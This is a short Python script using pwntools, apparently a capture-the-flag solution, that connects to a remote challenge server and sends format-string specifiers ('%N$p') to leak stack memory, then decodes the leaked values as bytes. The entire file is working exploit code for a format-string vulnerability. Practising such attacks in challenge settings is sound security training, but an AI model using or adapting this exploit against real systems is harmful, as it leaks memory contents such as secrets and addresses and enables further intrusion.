#!/usr/bin/env python3
from pwn import *
# context.log_level = 'debug'
data_list = []
def solve(begin, end, step):
	for i in range(begin, end, step):
		r = remote(host= 'host1.metaproblems.com', port=5470)
		tmp = b''
		for j in range(step):
			tmp += bytes(f'%{i+j}$p-', 'utf-8')
		r.sendline(tmp)
		r.recvuntil(b'Your guessed wrong with ')
		leak_lst = r.recvline()[:-2].split(b'-')
		for x in leak_lst:
			if(x != b'(nil)'):
				data_list.append(x.decode())
		r.close()
		continue

solve(1, 2, 17)
for hex_chars in data_list:
	print(p64(int(hex_chars, 16)))